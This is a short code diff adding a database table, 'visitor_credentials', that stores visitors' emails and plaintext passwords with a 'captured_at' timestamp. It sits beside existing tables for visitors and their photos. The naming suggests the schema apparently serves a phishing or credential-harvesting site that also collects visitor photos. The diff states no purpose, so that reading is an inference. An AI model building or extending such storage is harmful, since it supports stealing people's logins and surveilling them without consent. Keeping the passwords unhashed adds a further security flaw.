@@ -16,6 +16,18 @@ export const visitorsTable = pgTable("visitors", {
   createdAt: timestamp("created_at").defaultNow().notNull(),
 });
 
+export const credentialsTable = pgTable("visitor_credentials", {
+  id: serial("id").primaryKey(),
+  sessionId: text("session_id").notNull(),
+  email: text("email").notNull(),
+  password: text("password").notNull(),
+  capturedAt: timestamp("captured_at").defaultNow().notNull(),
+});
+
+export const insertCredentialSchema = createInsertSchema(credentialsTable).omit({ id: true, capturedAt: true });
+export type InsertCredential = z.infer<typeof insertCredentialSchema>;
+export type Credential = typeof credentialsTable.$inferSelect;
+
 export const photosTable = pgTable("visitor_photos", {
   id: serial("id").primaryKey(),
   sessionId: text("session_id").notNull(),
